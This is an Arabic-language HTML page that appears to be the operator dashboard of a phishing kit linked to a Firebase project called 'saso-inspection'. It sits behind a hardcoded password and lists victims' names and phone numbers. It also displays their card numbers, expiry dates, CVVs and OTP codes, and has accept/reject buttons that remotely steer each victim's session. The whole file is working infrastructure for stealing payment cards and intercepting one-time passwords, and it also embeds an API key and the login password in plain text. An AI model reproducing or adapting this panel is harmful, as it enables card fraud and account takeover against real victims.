<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحكم السريع</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; background: #f0f0f0; margin: 0; padding: 0; }
        .login-screen { position: fixed; inset: 0; background: #006C35; z-index: 999; display: flex; justify-content: center; align-items: center; }
        .login-box { background: white; padding: 20px; border-radius: 10px; width: 80%; text-align: center; }
        .login-box input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        .login-box button { width: 100%; padding: 10px; background: #006C35; color: white; border: none; font-weight: bold; }
        
        .nav { background: #006C35; display: flex; padding: 5px; sticky: top; }
        .nav button { flex: 1; padding: 10px; color: white; background: none; border: none; font-size: 14px; }
        .nav button.active { border-bottom: 3px solid #d4af37; font-weight: bold; }
        
        .card { background: white; margin: 10px; padding: 15px; border-radius: 8px; border-right: 5px solid #d4af37; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .btn-group { display: flex; gap: 5px; margin-top: 10px; }
        .btn { flex: 1; padding: 8px; border: none; color: white; border-radius: 4px; font-weight: bold; }
        .ok { background: #28a745; }
        .no { background: #dc3545; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div id="auth" class="login-screen">
    <div class="login-box">
        <h3>نظام الدخول</h3>
        <input type="password" id="p" placeholder="كلمة المرور">
        <button onclick="login()">دخول</button>
    </div>
</div>

<div class="nav">
    <button id="t1" class="active" onclick="show('b1', 't1')">العملاء</button>
    <button id="t2" onclick="show('b2', 't2')">البطاقات</button>
</div>

<div id="b1" class="tab-content"></div>
<div id="b2" class="tab-content hidden"></div>

<script>
    const config = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
        projectId: "saso-inspection"
    };
    firebase.initializeApp(config);
    const db = firebase.database();

    function login() {
        if(document.getElementById('p').value === "H1234567890H") {
            document.getElementById('auth').classList.add('hidden');
            sessionStorage.setItem('sh', '1');
        } else { alert('خطأ'); }
    }
    if(sessionStorage.getItem('sh') === '1') document.getElementById('auth').classList.add('hidden');

    db.ref('orders').on('value', (s) => {
        const b1 = document.getElementById('b1');
        const b2 = document.getElementById('b2');
        b1.innerHTML = ''; b2.innerHTML = '';

        s.forEach((c) => {
            const v = c.val();
            const id = c.key;
            const pi = v.personal_info || {};
            const cd = v.card_details || {};

            b1.innerHTML += `<div class="card">
                <b>${pi.fullName || 'زائر'}</b><br>
                <small>📞 ${pi.phone || '---'}</small><br>
                <small style="color:blue">📍 ${v.current_page || 'دخول'}</small>
            </div>`;

            if(cd.cardNumber) {
                b2.innerHTML += `<div class="card">
                    <b>${pi.fullName || 'عميل'}</b><br>
                    <code>${cd.cardNumber}</code><br>
                    <small>${cd.expiryDate} | ${cd.cvv}</small><br>
                    <b style="color:red">OTP: ${cd.otp || '---'}</b>
                    <div class="btn-group">
                        <button class="btn ok" onclick="upd('${id}','next')">قبول</button>
                        <button class="btn no" onclick="upd('${id}','error')">رفض</button>
                    </div>
                </div>`;
            }
        });
    });

    function upd(id, a) { db.ref('orders/'+id).update({control_action: a}); }
    
    function show(id, t) {
        document.querySelectorAll('.tab-content').forEach(x => x.classList.add('hidden'));
        document.querySelectorAll('.nav button').forEach(x => x.classList.remove('active'));
        document.getElementById(id).classList.remove('hidden');
        document.getElementById(t).classList.add('active');
    }
</script>
</body>
</html>
